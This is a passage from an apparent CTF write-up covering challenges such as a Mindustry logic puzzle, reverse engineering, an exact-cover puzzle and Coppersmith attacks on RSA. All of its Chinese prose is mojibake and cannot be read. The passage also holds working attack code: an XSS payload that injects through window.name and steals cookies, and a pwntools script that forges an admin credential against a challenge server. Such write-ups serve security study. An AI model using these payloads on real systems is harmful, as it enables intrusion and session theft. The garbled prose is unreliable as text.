op equal fl1 0 sw1
op equal fl2 0 sw6
op or fl3 fl1 fl2
jump 38 equal fl3 0
set en 0
control enabled generator1 en 0 0 0
control enabled panel1 en 0 0 0
end
```

ç®€å•åæ±‡ç¼–ï¼š

```log
jump 33 greaterThanEq i 16      # if i >= 16 goto 33
op pow fl0 i 2                  # fl0 = i^2
jump 31 notEqual fl0 number     # if fl0 != number goto 31
set en 1                        # en = 1
jump 33 always x false          # goto 33
op add i i 1                    # i++
jump 26 always x false          # goto 26
op equal fl1 0 sw1              # fl1 = sw1 == 0
op equal fl2 0 sw6              # fl2 = sw6 == 0
op or fl3 fl1 fl2               # fl3 = fl1 || fl2
jump 38 equal fl3 0             # if fl3 == 0 goto 38
set en 0                        # en = 0
```

- `fl3 != 0` => `sw1 == 1 || sw6 == 1`
- `number is ? ** 2`

```py
for i in range(16):
    bits = bin(i ** 2)[2:].zfill(8)
    if bits[0] == '1' and bits[5] == '1':
        print(i**2, bits)
```

ç›´æ¥å¯ä»¥å¾—åˆ°ï¼š`11000100`

**ç¬¬ä¸‰éƒ¨åˆ†ï¼š**

```log
sensor sw1 switch1 @enabled
sensor sw2 switch2 @enabled
sensor sw3 switch3 @enabled
sensor sw4 switch4 @enabled
sensor sw5 switch5 @enabled
sensor sw6 switch6 @enabled
sensor sw7 switch7 @enabled
sensor sw8 switch8 @enabled
sensor sw9 switch9 @enabled
control enabled conveyor2 sw1 0 0 0     # sw1 <- ?
control enabled gate1 sw2 0 0 0         # sw2 <- 0
op equal nsw3 sw3 0                     # nsw3 = sw3 == 0 (not sw3)
control enabled reactor1 nsw3 0 0 0
control enabled reactor2 nsw3 0 0 0
control enabled conduit1 sw4 0 0 0      # sw4 <- 0
control enabled conduit2 sw4 0 0 0
control enabled mixer1 sw5 0 0 0        # sw5 <- 1
control enabled extractor1 sw6 0 0 0    # sw6 <- 1
control enabled meltdown1 sw7 0 0 0     # sw7 <- 0
control enabled meltdown2 sw7 0 0 0
op equal result sw8 sw9                 # result = sw8 == sw9
jump 28 equal result true               # if result == true goto 28
control enabled mixer1 0 0 0 0
control enabled conduit2 1 0 0 0
control enabled reactor1 1 0 0 0
control enabled reactor2 1 0 0 0
control enabled conveyor2 1 0 0 0
wait 5
end
```

éœ€è¦åˆ†æä¸€ä¸‹æ¸¸æˆé€»è¾‘ï¼Œæœ‰ååº”å †è‚¯å®šæœ‰å†·å´æ¶²ä½“ï¼Œé‚£ä¹ˆè‚¯å®šéœ€è¦å…ˆä¿è¯å†·å´æ¶²çš„åˆ¶é€ ã€ç®¡é“æ²¡æœ‰æ³„æ¼ï¼Œä¹‹åå‘ç° `meltdown` ä¼šå¤§é‡æ¶ˆè€—ç”µåŠ›ï¼Œä¸åº”è¯¥å¯åŠ¨ã€‚

å› æ­¤ç»“åˆè¿™äº›æ¡ä»¶ï¼Œå¯ä»¥å¾—åˆ° `10001100`ï¼Œå¤§æ¦‚ä¹Ÿå°±ç‚¸äº†å‡ æ¬¡å§ï¼ˆé€ƒ

**ç¬¬å››éƒ¨åˆ†ï¼š**

å°è¯•è¿›è¡Œæ¸¸æˆå†…éƒ¨æŠŠç©ï¼Œå¯ä»¥å¾—åˆ° `01110111`

æœ€ç»ˆç»“æœå°±æ˜¯ **10100101110001001000110001110111**

**`flag{B34WarE_0f_#xp1osi0N_d894cdf5db}`**

## å¾®ç§¯åˆ†è®¡ç®—å°ç»ƒä¹  2.0

å¡äº†å¾ˆä¹…ï¼Œå°è¯•äº†å„ç§ `location`ã€`location["hash"]`ã€`origin` ç­‰ `window` å¯¹è±¡çš„å±æ€§ï¼Œç”±äºå­˜åœ¨ `escape` éƒ½æ²¡æœ‰æˆåŠŸè¿›è¡Œ HTML æ³¨å…¥ã€‚

ä¹‹åæ ¹æ® `popup` æ‰¾åˆ°äº†æœ‰å…³ `window.open` çš„æ–‡æ¡£å’Œ `window.name` å±æ€§çš„è§£é‡Š [target](https://developer.mozilla.org/en-US/docs/Web/API/Window/open#target)ï¼Œæåˆ°äº†ï¼š

> A string, without whitespace, specifying the name of the browsing context the resource is being loaded into.

å› æ­¤ XSS é“¾æ¡å°±å¯ä»¥æ„æˆï¼Œé€šè¿‡ç»™ comment æäº¤ `"+name+"` æ¥åˆå§‹åŒ–é¡µé¢åï¼Œåˆ©ç”¨ï¼š

```html
<!DOCTYPE html>
<html>
<head>
    <title>Test</title>
</head>
<body>
    <script>
        var result = new URL("http://web/result");
        var payload = `<img src onerror=([{a:document.getElementsByClassName('form-control')[0].value=window.btoa(document.cookie.slice(0,16))},{b:document.getElementsByClassName('btn')[0].click()}])>`;
        window.open(result.href, 'Hello!</p>' + payload);
    </script>
</body>
</html>
```

è¿›è¡Œæ³¨å…¥å’Œå¯¹ flag çš„åˆ‡ç‰‡è·å–ï¼š

```log
"ZmxhZz1mbGFnJTdCeDU1Xw=="
"c3RpbGxfYWxpdmUlMjYlMw=="
"RCUzRV8lM0MrXzcwYjczMA=="
"MjFkMSU3RA=="

"flag=flag{x55_still_alive&=>_< _70b73021d1}"
```

**`flag{x55_still_alive&=>_< _70b73021d1}`**

## é€†å‘å·¥ç¨‹ä¸éœ€è¦ F5

é€†å‘å·¥ç¨‹éœ€è¦æ¯…åŠ›å’Œè€å¿ƒã€‚

åœ¨æ‰‹åŠ¨æå–å¹¶é˜…è¯»äº† 420+ è¡Œæ±‡ç¼–åå°±å¯ä»¥è§£å‡ºæ¥äº†ã€‚

ä»¥å…¶ä¸­ä¸€éƒ¨åˆ†ä¸¾ä¾‹ï¼š

```s
mov     [rsp+1D8h+k], 0
cmp     [rsp+1D8h+k], 4         // for (k = 0; k < 4)
jge     loc_140001271
mov     [rsp+1D8h+m], 0
cmp     [rsp+1D8h+m], 8
jge     short loc_140001260     // for (m = 0; m < 8)
lea     r14, [rsp+1D8h+k]       // r14 = &k
lea     r13, [rsp+1D8h+ret_3]   // r13 = &ret_3

<!-- call    sub_140001550 -->

mov     rdx, r13                // rdx = &ret_3
mov     r14d, [r14]             // r14 = k
mov     r15d, 2                 // r15 = 2

<!-- mov     rcx, cs:lib10_18cc -->
<!-- call    rcx ; lib10_18cc -->

// lib10

push    rcx
mov     rcx, r15                // rcx = 2
mov     r9, r14                 // r9 = k
shl     r9, cl                  // r9 = k << 2
pop     rcx

// sub_140001550

mov     r14d, 0DEADBEEFh        // r14 = 0xDEADBEEF
mov     r15d, r9d               // r15 = r9 = k << 2

<!-- mov     rcx, cs:lib13_90ea -->
<!-- call    rcx ; lib13_90ea -->

// lib13

mov     r9, r14                 // r9 = 0xDEADBEEF
xor     r9, r15                 // r9 = 0xDEADBEEF ^ (k << 2)

mov     [rdx], r9               // ret_3 = 0xDEADBEEF ^ (k << 2)
<!-- jmp     short loc_14000155E -->
<!-- retn -->

mov     r13, [rsp+1D8h+ret_3] // r13 = ret_3

lea     r10, [rsp+1D8h+pos]
lea     r14, [rsp+1D8h+m]
lea     r15, [rsp+1D8h+ret_4]
lea     rcx, [rsp+1D8h+ret_5]
lea     rdx, [rsp+1D8h+ret_6]

<!-- mov     rax, cs:lib02 -->
<!-- call    rax ; lib02 -->
// lib2

mov     [r15], r13d             // ret_4 = ret_3
mov     rsi, [r10]              // rsi = pos
mov     [rcx], rsi              // ret_5 = [r10] = pos
movsxd  rsi, dword ptr [r14]    // rsi = m
mov     [rdx], rsi              // ret_6 = [r14] = m


// main

mov     r13d, [rsp+1D8h+ret_4]  // r13 = ret_4 = ret_3
mov     r14, [rsp+1D8h+ret_5]   // r14 = ret_5 = pos
mov     r15, [rsp+1D8h+ret_6]   // r15 = ret_6 = m

<!-- mov     rax, cs:lib09 -->
<!-- call    rax ; lib09 -->

// lib09

imul    r13d, [r14+r15*4]       // r13 = ret_3 * pos[m(*4)]
mov     [r14+r15*4], r13d       // pos[m] = ret_3 * pos[m(*4)]

// main

// lea     r14, [rsp+1D8h+m]
// call    sub_1400015A0        -> lib12 -> m++

// lea     rdx, [rsp+1D8h+k]
// call    sub_1400015D0        -> lib12 -> k++
```

ä¸Šè¿°æ±‡ç¼–æè¿°äº†ï¼š

```py
def stage2(flag):
    # xor by 0xdeadbeef, dword
    num = 0xdeadbeef
    flag = bytes_to_int32(flag)
    for k in range(4):
        a = num ^ (k << 2)
        for m in range(8):
            flag[m] = (flag[m] * a) & 0xffffffff
    ret = int32_to_bytes(flag)
    print(ret.hex())
    return ret
```

æœ€åå¾—åˆ°çš„æ­£å‘ä»£ç ï¼š

```py
def stage0(flag):
    # guess this is int128
    num = 0x55AA00FF
    mask = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
    flag = bytes_to_int128(flag)
    for n in range(4):
        for m in range(2):
            a = num ^ (n << 4)
            flag[m] = (flag[m] * a) & mask
    ret = int128_to_bytes(flag)
    print(ret.hex())
    return ret

def stage1(flag):
    # xor by 0x7a026655fd263677, qword
    num = 0x7a026655fd263677
    flag = bytes_to_int64(flag)
    for j in range(4):
        flag[j] ^= num
    ret = int64_to_bytes(flag)
    print(ret.hex())
    return ret

def stage2(flag):
    # xor by 0xdeadbeef, dword
    num = 0xdeadbeef
    flag = bytes_to_int32(flag)
    for k in range(4):
        a = num ^ (k << 2)
        for m in range(8):
            flag[m] = (flag[m] * a) & 0xffffffff
    ret = int32_to_bytes(flag)
    print(ret.hex())
    return ret

def stage3(flag):
    # xor by 0xcdec, word
    num = 0xcdec
    flag = bytes_to_int16(flag)
    for m in range(16):
        flag[m] ^= num
    ret = int16_to_bytes(flag)
    print(ret.hex())
    return ret

def stage4(flag):
    # xor by byte
    flag = [i for i in flag]
    for j in range(4):
        for k in range(32):
            m = 0x21 ^ (j << 1)
            flag[k] = (flag[k] * m) & 0xff
    ret = bytes(flag)
    print(ret.hex())
    return ret
```

äºæ˜¯è¿›è¡Œé€†å‘ç¨‹åºç¼–å†™ï¼š

```py
def stage4_rev(flag):
    # xor by byte
    flag = [i for i in flag]
    for j in range(4):
        for k in range(32):
            m = 0x21 ^ (j << 1)
            inverse_m = inverse(m, 256)
            flag[k] = (flag[k] * inverse_m) & 0xff
    ret = bytes(flag)
    print("s4:", ret.hex())
    return bytes(flag)

def stage3_rev(flag):
    # xor by 0xcdec, word
    num = 0xcdec
    flag = bytes_to_int16(flag)

    for m in range(16):
        flag[m] ^= num

    ret = int16_to_bytes(flag)
    print("s3:", ret.hex())
    return ret

def stage2_rev(flag):
    # xor by 0xdeadbeef, dword
    num = 0xdeadbeef
    flag = bytes_to_int32(flag)
    for k in range(4):
        a = num ^ (k << 2)
        for m in range(8):
            inverse_k = inverse(a, 2 ** 32)
            flag[m] = (flag[m] * inverse_k) & 0xffffffff
    ret = int32_to_bytes(flag)
    print("s2:", ret.hex())
    return ret

# just xor
stage1_rev = stage1

def stage0_rev(flag):
    num = 0x55AA00FF
    mask = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
    flag = bytes_to_int128(flag)
    for n in range(4):
        for m in range(2):
            a = num ^ (n << 4)
            inverse_a = inverse(a, 2 ** 128)
            flag[m] = (flag[m] * inverse_a) & mask
    ret = int128_to_bytes(flag)
    print(ret.hex())
    return ret

hackergame = '7F 02 57 CD 9F D9 34 92  1A 1F 24 12 AE C5 E7 42' \
             'AF AB 40 CC 36 D5 E9 05  AB 0C A8 EB 96 41 A7 AC'
hackergame = bytes.fromhex(hackergame.replace(' ', ''))

ret = hackergame
ret = stage4_rev(ret)
ret = stage3_rev(ret)
ret = stage2_rev(ret)
ret = stage1_rev(ret)
ret = stage0_rev(ret)

print(f"flag:{{{ret.decode()}}}")
```

**`flag{DECoMp!!ER_15_nOT_@Lways_Enough~}`**

## O(1) ç”¨æˆ·ç™»å½•ç³»ç»Ÿ

å¾ˆå‘çš„ä¸€é“é¢˜ï¼Œè·³å‡ºæ€ç»´é™·é˜±çš„æ—¶é—´å¤§æ¦‚æ˜¯ 2 å¤©ã€‚

æ ¸å¿ƒç›®æ ‡ä¸ºæ„å»ºä¸€ä¸ªå¯ä»¥è¢« `.decode("utf-8")` çš„å«æœ‰ `:` çš„å­—ç¬¦ä¸²ï¼Œä¸”è®©å®ƒä½œä¸ºä¸€æ£µå¶å­èŠ‚ç‚¹å­˜åœ¨ `admin:xxxx` çš„æ ‘çš„æ ¹ã€‚

```py
from hashlib import sha1
from pwn import *

def solve(target=b'admin:11451'):
    target = sha1(b'admin:11451').digest()
    padding = b'11451' * 4
    nxt = target
    current = target

    while True:
        # avoid '\n' but need ':'
        if 0x3a in nxt and 0x0a not in nxt:
            try:
                nxt.decode()

                # result can be put into the "user:pass" format
                # construct the chain to this
                return nxt + padding, [current, padding]

            except:
                pass

        current = nxt
        if current > target:
            nxt = sha1(target + current).digest()
        else:
            nxt = sha1(current + target).digest()


user, padding = solve()

padding = ''.join([p.hex() for p in padding])

sh = remote('202.38.93.111', 10094)

sh.sendlineafter(b'token: \n', token)

sh.sendlineafter(b'Choice: ', b'1')

other = b'1:1'

sh.sendlineafter(b'> ', other)
sh.sendlineafter(b'> ', user)
sh.sendlineafter(b'> ', b'EOF')

log.info(f'user: {user}')

credential = 'admin:11451:' + padding + sha1(other).hexdigest()

log.info(f'credential: {credential}')

sh.sendlineafter(b'Choice: ', b'2')
sh.sendlineafter(b'credential: ', credential.encode())

sh.recvuntil(b'Hello, admin!\n')

print(sh.recvline().decode())

sh.close()
```

## å° Z çš„è°œé¢˜

è¿™é“é¢˜å‡ºçš„å¾ˆå¥½æˆ‘å¾ˆå–œæ¬¢ï¼Œæ€ç»´éš¾åº¦ä¹Ÿæœ‰ï¼Œèƒ½å¤ŸæŠŠé—®é¢˜å†™æˆè¿™æ ·çš„ä»£ç ä¹Ÿç¡®å®å¾ˆå¼ºã€‚

é¦–å…ˆï¼Œå…ˆç»™å‡ºæœ¬é“é¢˜æè¿°çš„é—®é¢˜ï¼Œå³ï¼šå°† 16 ä¸ªé•¿æ–¹ä½“æ”¾åœ¨ä¸€ä¸ª 5x5x5 çš„ç«‹æ–¹ä½“ä¸­ï¼Œé™åˆ¶äº†æ¯ä¸ªæ–¹å—çš„å½¢çŠ¶å’Œæ•°é‡ã€‚

æœ‰è¿™æ ·çš„å‰æåæˆ‘ä»¬çœ‹ä¸€ä¸‹ä»£ç æè¿°äº†ä»€ä¹ˆï¼š

```py
# è¾¹é•¿ä¸º 5
bound = 5
# æ¯ä¸ªé•¿æ–¹ä½“çš„å½¢çŠ¶æ˜¯ä»€ä¹ˆ
constraints = ((1, 1, 3), (1, 2, 2), (1, 2, 4), (1, 4, 4), (2, 2, 2), (2, 2, 3))
# æ¯ä¸ªé•¿æ–¹ä½“çš„æ•°é‡æ˜¯å¤šå°‘
count = [3, 4, 2, 2, 2, 3]
```

é¦–å…ˆï¼Œå¯¹äº 16 ä¸ªæ–¹å—ï¼Œéƒ½éœ€è¦æ”¾åœ¨ 5x5x5 çš„ç«‹æ–¹ä½“ä¸­ï¼š

```py
for i in range(num_constraints):
    for j in range(num_dims):
        for k in range(3):
            if k == 2:
                arrange[i][j][k] = -1
            else:
                number = int(next(s))
                assert 0 <= number <= bound
                arrange[i][j][k] = number

print('Stage 0 passed')
```

ä¹‹åï¼Œè¿™äº›é•¿æ–¹ä½“å¿…é¡»æœ‰åºå¾—è¢«è¾“å…¥ï¼š

```py
assert arrange == list(sorted(arrange))

print('Stage 1 passed')
```

å†ä¹‹åï¼Œè¿™äº›é•¿æ–¹ä½“äº’ç›¸ä¸å­˜åœ¨è¦†ç›–å…³ç³»ï¼š

```py
for i in range(num_constraints):
    for j in range(num_constraints):
        if i == j:
            continue
        assert any((arrange[i][k][1] <= arrange[j][k][0] or arrange[j][k][1] <= arrange[i][k][0]) for k in range(num_dims))

print('Stage 2 passed')
```

æœ€åï¼Œè¿™äº›é•¿æ–¹ä½“æ»¡è¶³æ•°é‡é™åˆ¶ï¼š

```py
for i in range(num_constraints):
    for t in range(len(constraints)):
        if tuple(sorted([arrange[i][j][1] - arrange[i][j][0] for j in range(num_dims)])) == constraints[t]:
            count[t] -= 1
            break

assert not any(count)

print('Stage 3 passed')
```

ç„¶åè®¡ç®—åˆ†æ•°ï¼šè¿™ä¸€ç®—æ³•çš„ç»“æœè¿‘ä¼¼ç­‰ä»·äºæ‰€æœ‰æ–¹å—å¯¹ `x = -1`ï¼Œ`y = -1` å’Œ `z = -1` ä¸‰ä¸ªå¹³é¢çš„æŠ•å½±ç‚¹ï¼ŒåŠ ä¸Šä»–ä»¬æœ¬èº«çš„é¡¶ç‚¹çš„æ•°é‡ï¼Œè¿‘ä¼¼æ˜¯å› ä¸ºè¿˜æœ‰äº›åœ¨ä¸‰é¢çš„äº¤çº¿ä¸Šã€‚

```py
score = len(set((x, y, z) for i in range(num_constraints) for x, y, z in itertools.product(*arrange[i])))

if score >= 157:
    print(open('/flag3').read())
elif score <= 136:
    print(open('/flag2').read())
else:
    print(open('/flag1').read())
```

åœ¨ç†è§£äº†è¿™ä¸ªé—®é¢˜ä¹‹åï¼Œæˆ‘éšçº¦è§‰å¾—æœ‰ç‚¹åƒä¿„ç½—æ–¯æ–¹å—ã€æ•°ç‹¬ä¹‹ç±»çš„ï¼Œé‚æœç´¢å¾—åˆ°äº† â€œç²¾ç¡®è¦†ç›–â€ é—®é¢˜ï¼Œå¹¶å¾—çŸ¥äº†èˆè¹ˆé“¾å’Œ X ç®—æ³•ã€‚

â€¦â€¦è¿™ä¸ªç®—æ³•å¤§é‡ä½¿ç”¨é“¾è¡¨ï¼Œäºæ˜¯æˆ‘è¿˜åœ¨çº ç»“ç”¨ pythonã€rust éƒ½æŒºçƒ¦çš„â€¦â€¦

æœ€ç»ˆé€‰æ‹©å»æ´›è°·ä¸Šå·äº†ä¸ª OI ä»£ç ï¼Œä¸å¾—ä¸è¯´ï¼Œç°åœ¨çœ‹ OI çš„ä»£ç çœŸæ˜¯æŠ˜ç£¨â€¦â€¦

å°†æ•°é‡é™åˆ¶ä¹Ÿä½œä¸º DFS æ¡ä»¶çš„ä¸€éƒ¨åˆ†ï¼Œå¯ä»¥å¾—åˆ°å¦‚ä¸‹ä»£ç ï¼š

```cpp
bool dance(int k) {
    if (head.L == (&head)) {
        if (k != 16)
            return false;

        cout << "[";
        for (int i = 0; i < k - 1; i++) {
            cout << ans[i] << ", ";
        }

        cout << ans[k - 1] << "]" << endl;
        return true;
    }
    int INF = (1 << 30), c = -1;
    for (DLXnode *ptr = head.L; ptr != (&head); ptr = ptr->L) {
        if (sz[ptr->c] < INF) {
            INF = sz[ptr->c];
            c = ptr->c;
        }
    }
    cover(c);
    DLXnode *ptr;

    for (ptr = col[c].D; ptr != (&col[c]); ptr = ptr->D) {
        if (limit[limit_map[ptr->r]] == 0) {
            continue;
        }

        DLXnode *rc;
        ptr->R->L = ptr;
        for (rc = ptr->L; rc != ptr; rc = rc->L) {
            cover(rc->c);
        }

        ptr->R->L = ptr->L;
        ans[k] = ptr->r;
        limit[limit_map[ptr->r]]--;

        dance(k + 1);

        limit[limit_map[ptr->r]]++;
        ptr->L->R = ptr;
        for (rc = ptr->R; rc != ptr; rc = rc->R) {
            re(rc->c);
        }
        ptr->L->R = ptr->R;
    }
    re(c);
    return false;
}

int main() {
    freopen("in.txt", "r", stdin);
    freopen("out.txt", "w", stdout);
    cin >> n >> m >> l;

    init(m, n);
    int sr;

    for (int i = 0; i < l; i++) {
        cin >> limit[i];
    }

    for (int i = 0; i < m; i++) {
        cin >> limit_map[i];
        for (int j = 0; j < n; j++) {
            cin >> sr;
            if (sr == 1) {
                addnode(i, j);
            }
        }
    }

    dance(0);
    return 0;
}
```

å‚è€ƒå®ç°ï¼š[é¢˜è§£ P4929 ã€æ¨¡æ¿ã€‘èˆè¹ˆé“¾ï¼ˆDLXï¼‰](https://www.luogu.com.cn/blog/Setsugesuka/solution-p4929)

ä¹‹åè¿›è¡Œæ•°æ®é¢„å¤„ç†ï¼Œæ„é€ ä¸º OI ä¹ æƒ¯çš„è¾“å…¥å½¢å¼ï¼Œå¹¶ç”Ÿæˆä¸€äº›å°è§„æ¨¡çš„æµ‹è¯•ç”¨ä¾‹ã€‚

```py
from itertools import permutations


def check_block(block, i, j, k, col_unit):
    return i + block[0] <= col_unit and j + block[1] <= col_unit and k + block[2] <= col_unit


def gen_rows(blocks, col_unit):
    rows = set()

    for idx, block in enumerate(blocks):
        for i in range(col_unit):
            for j in range(col_unit):
                for k in range(col_unit):
                    for b in permutations(block):
                        if check_block(b, i, j, k, col_unit):
                            rows.add(((i, j, k), b, idx))

    return rows

def pos_block_to_01(row, col_unit):
    # convert the position of the block to 0-1
    bits = [0] * (col_unit ** 3)
    pos, block, _ = row
    # pos = start position of the block, from (0,0,0) to (5,5,5)
    # block = size of the block
    # record bits means the block is placed in the position
    # from (0,0,0) to (4,4,4), different from pos
    # because the bits means a small cube, not a position
    for i in range(pos[0], pos[0] + block[0]):
        for j in range(pos[1], pos[1] + block[1]):
            for k in range(pos[2], pos[2] + block[2]):
                # print(f"i={i}, j={j}, k={k} for block {block}")
                bits[i * (col_unit ** 2) + j * col_unit + k] = 1

    return bits

def gen_files(fname, col_unit, blocks, limit):
    col_num = col_unit ** 3
    tot_vol = 0
    for i in range(len(blocks)):
        tot_vol += (blocks[i][0] * blocks[i][1] * blocks[i][2]) * limit[i]
    assert tot_vol == col_num

    rows = gen_rows(blocks, col_unit)
    rows = sorted(list(rows))

    res = [(row, pos_block_to_01(row, col_unit)) for row in rows]

    with open(f'{fname}.in.txt', 'w') as f:
        f.write(str(col_num) + ' ' + str(len(res)) +
                ' ' + str(len(limit)) + '\n')
        f.write(' '.join(map(str, limit)) + '\n')
        for row in res:
            f.write(str(row[0][2]) + ' ')
            f.write(' '.join(map(str, row[1])))
            f.write('\n')

    with open(f'{fname}.map.txt', 'w') as f:
        for idx, row in enumerate(rows):
            f.write(str([idx, row[0], row[1], row[2]]) + '\n')

blocks = [(1, 1, 3), (1, 2, 2), (1, 2, 4), (1, 4, 4), (2, 2, 2), (2, 2, 3)]
limit = [3, 4, 2, 2, 2, 3]

gen_files('5x5x5', 5, blocks, limit)

blocks = [(1, 1, 2), (1, 1, 3)]
limit = [9, 3]

gen_files('3x3x3', 3, blocks, limit)

blocks = [(1, 1, 2)]
limit = [4]

gen_files('2x2x2', 2, blocks, limit)
```

è¿™ä¸ªç¨‹åºä¼šäº§ç”Ÿå·¨é‡çš„å¯è¡Œè§£ï¼ˆ2min æ—¶é—´è¾“å‡ºæ–‡ä»¶ä¸º 10MBï¼‰ï¼Œä¹‹åå¯¹äºè¿™ä¸ªæ•°æ®è¾“å‡ºè¿›è¡Œç­›é€‰ï¼Œå¾—åˆ°éœ€è¦çš„è§£ï¼š

```py
import itertools

data = [eval(i) for i in open('out.txt', 'r').readlines()]
maps = [eval(i) for i in open('5x5x5.map.txt', 'r').readlines()]

def format_str(d):
    d = list(sorted(d))
    result = ""
    for i in d:
        for j in i:
            result += str(j[0]) + str(j[1])
    return result


flags = [False] * 3

for co in data:
    choice = [maps[i] for i in co]
    lines = [[[item[1][i], item[1][i] + item[2][i], -1]
              for i in range(3)] for item in choice]
    score = len(set((x, y, z) for i in range(16)
                    for x, y, z in itertools.product(*lines[i])))

    if score >= 157 and not flags[0]:
        print(score, format_str(lines))
        flags[0] = True

    elif score <= 136 and not flags[1]:
        print(score, format_str(lines))
        flags[1] = True

    elif not flags[2]:
        print(score, format_str(lines))
        flags[2] = True

    if all(flags):
        break
```

å¾ˆå¿«å°±èƒ½å¾—åˆ°ä¸‰ä¸ªï¼š

```log
138 022335023435030213030235032413034545040401044504232435343414350213350235352315353545450301453504
136 022434022445030213030235032413034545040401044504232435343414350213350235352315353545450301453504
157 012415014525020235030213040401044502133525143412152315250235350113351213353524353545450301453502
```

**`flag{G0og1e_1s_a1l_y0u_n3ed_5c3bd816b2}`**
**`flag{DFS_A1g0ri7hm_1s_u5efu1_58e68f15a4}`**
**`flag{Knuths_A1g0ri7hm_X_1s_p0w3rful_051b0574a1}`**

## é»‘å®¢é©¬æ‹‰æ¾

è¿™é“é¢˜çš„ç¬¬äºŒé—®æ˜¾ç„¶è¦æ¯”ç¬¬ä¸€é—®ç®€å•ã€‚

### ä¸€ç™ºå‹è² 

å…ˆè€ƒè™‘å®ƒæè¿°äº†ä¸€ä¸ªä»€ä¹ˆé—®é¢˜ï¼šå¯¹äºä¸€ä¸ªæ ‡å‡†çš„ RSA è¿‡ç¨‹ï¼Œè€ƒè™‘

```py
k = 928
state = state >> k
state = pow(state, e, N)
what_you_know = int(state) & ((1 << k) - 1)

assert state == int(input("guess: "))
```

ä¹Ÿå³å¯¹äº $c = m^e \bmod N$ï¼Œæˆ‘ä»¬å·²ç»çŸ¥é“äº† $N, e$ å’Œ $c$ çš„ä½ $k$ ä½ï¼Œæ±‚ $m$ã€‚

è€ŒåŒæ—¶æˆ‘ä»¬è¿˜çŸ¥é“ï¼š$m$ åªæœ‰ä½ $1024 - 928 = 96 \ bits$ï¼Œä¸” $c$ åªæœ‰é«˜ $96 \ bits$ æ˜¯æœªçŸ¥çš„ã€‚

åˆ©ç”¨å¤šå…ƒçš„ CopperSmith æ–¹æ³•ï¼Œæˆ‘ä»¬éœ€è¦å¾—åˆ°ä¸€ä¸ª $f(x, y)$ï¼Œä½¿å¾— $f(x, y) = 0 \bmod N$ã€‚

ä¸å¦¨è€ƒè™‘æ„é€ ä¸€ä¸ª $e = -3$ï¼Œæ­¤æ—¶ $e$ åœ¨æ¨¡ $\phi$ çš„æ„ä¹‰ä¸‹æ˜¯ä¸€ä¸ªå¾ˆå¤§çš„æ•°ï¼Œä¸”èƒ½æ»¡è¶³é¢˜ç›®å¯¹äºé€†å…ƒçš„è¦æ±‚ã€‚

è€Œæ­¤æ—¶æˆ‘ä»¬è€ƒè™‘å‰å¼ï¼Œæœ‰ï¼š

$$
\begin{aligned}
c = m^e \bmod N &\Rightarrow c \times m^{-e} = 1 \bmod N \\
&\Rightarrow c \times m^{-e} - 1 = 0 \bmod N \\
\end{aligned}
$$

å¯¹äºæˆ‘ä»¬é€‰å–çš„ $e = -3$ è€Œè¨€ï¼Œæˆ‘ä»¬å·²çŸ¥é“ $c_h$ï¼Œå¯ä»¥å¾—åˆ°ï¼š

$$ f(m, c_h) = (c_h \ll k + c_l) x^3 - 1 \bmod N $$

å¯¹è¿™ä¸€æ–¹ç¨‹è¿›è¡Œå¤šå…ƒ CopperSmith è®¡ç®—ï¼Œå¯ä»¥å¾—åˆ°ä¸€ç»„å°æ ¹ï¼Œä¹Ÿå°±æ˜¯ $m$ å’Œ $c_h$ çš„å€¼ã€‚

ç”±äºå¤šå…ƒ CopperSmith åœ¨ Sage ä¸­æ²¡æœ‰å®ç°ï¼Œæ‰€ä»¥éœ€è¦æ‰¾ä¸ª[è½®å­](https://github.com/defund/coppersmith/blob/master/coppersmith.sage)ï¼š

```py
def get_mm_ch(cl):
    F = PolynomialRing(Zmod(N), names=('m', 'hc',))
    (m, ch,) = F._first_ngens(2)
    po = 1 << k
    g = m ** 3 * (ch * po + cl) - 1
    return small_roots(g, [bound, bound], 3, 4)

lc = ... # low k bits of c
m, ch = get_mm_ch(cl)[0]
guess = pow(m, e, N)
```

**`flag{à¸šsE_hĞ”5h_0Ğ¯_5yMmEtrIÂ¢_Cipher_Æ’oĞ¯_CÂ§pĞ¯NG}`**

### æ•™ç»ƒï¼Œæœ‰äººæŠ¢è·‘ï¼

é¡ºç€ç¬¬äºŒé—®çš„æ€è·¯å¯ä»¥å»è€ƒè™‘ç¬¬ä¸€é—®çš„é—®é¢˜äº†ï¼š

```py
k = 928
for _ in range(100):
    state = pow(state, e, N)
    randomNums.append(int(state) & ((1 << k) - 1))
    states.append(state)

print(randomNums)
assert state == int(input("guess: "))
```

åœ¨æ¯ä¸¤è½®çš„è¿­ä»£ä¸­ï¼Œæˆ‘ä»¬èƒ½å¤Ÿå¾—åˆ°ä¸€ç»„ $c_l, m_l$ ä½¿å¾—ï¼š

$$
\begin{aligned}
& c_h \ll k + c_l = (m_h \ll k + m_l)^e \bmod N \\
\Rightarrow \ & (c_h \ll k + c_l) \times (m_h \ll k + m_l)^{-e}  - 1= 0 \bmod N \\
\end{aligned}
$$

è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†é—®é¢˜ä¹Ÿå˜ä¸ºäº†ä¸€ä¸ªå¤šå…ƒçš„ CopperSmith é—®é¢˜ï¼Œéœ€è¦æ±‚è§£çš„å°æ ¹åªæœ‰ $96 \ bits$ã€‚

å¯ä»¥åˆ—å‡ºå¦‚ä¸‹çš„æ–¹ç¨‹ï¼š

$$ f(m_h, c_h) = (c_h \ll k + c_l) \times (m_h \ll k + m_l)^{-e} - 1 \bmod N $$

ä½¿ç”¨åŒæ ·çš„æ–¹æ³•è¿›è¡Œæ±‚è§£ï¼Œä¸è¿‡æˆ‘ä»¬åªéœ€è¦æœ€åçš„ä¸€ç»„ $m_l$ å’Œ $c_l$ çš„å€¼å³å¯ã€‚

```py
def get_mh_ch(ml, cl):
    F = PolynomialRing(Zmod(N), names=('mh', 'ch',))
    (mh, ch,) = F._first_ngens(2)
    po = 1 << k
    g = (ch * po + cl) * (mh * po + ml) ** 3 - 1
    return small_roots(g, [bound, bound], 3, 6)

ml, cl = ... # low k bits of m and c
mh, ch = get_mh_ch(ml, cl)[0]
m = (mh << k) + ml
guess = pow(m, e, N)
```

PSï¼šä¸å¾—ä¸è¯´è¿™ä¸¤é—®çš„ flag å¥½ä¸‘å•Šï¼ˆ

**`flag{rsA_PĞ¯nG_CoULD_bÙ¤_ÃŸ4ckDoÙ¥Ğ¯Ù¤D}`**

## ä¸å¯åŠ å¯†çš„å¼‚ä¸–ç•Œ 2

### å¸Œå°”æ··æ·†

